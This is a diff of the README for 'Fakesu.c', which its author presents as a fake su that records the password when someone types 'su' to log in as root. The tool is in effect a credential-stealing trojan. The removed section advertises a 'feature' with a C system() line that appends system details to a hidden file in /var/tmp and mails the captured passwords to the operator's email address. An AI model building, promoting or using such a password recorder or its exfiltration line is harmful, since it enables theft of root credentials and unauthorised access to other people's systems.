@@ -3,22 +3,15 @@ Fakesu.c
 
 Abstract
 --------------
-This is my SU password recorder which will 
-automatically capture SU password when root type 
-su.
+SU password recorder which will automatically capture SU password
+when user type 'su' command to login root.
 
-My little 'feature'
--------------------------
-Auto send password file to your email :P
-
-'''c
-system("uname  -a >> /var/tmp/.pwds;  cat /var/tmp/.pwds | mail <your@email>")
-'''
+Special Thanks
+--------------
+Based on Oozie's fakesu.c in 2006
 
 - Zypeh 
 
 <hr>
-
 [![endorse] (http://api.coderwall.com/zypeh/endorsecount.png)] (http://coderwall.com/zypeh)
 
-[![Facebook] (http://bit.ly/VTsPK4)] (http://www.facebook.com/lisper.zypeh)
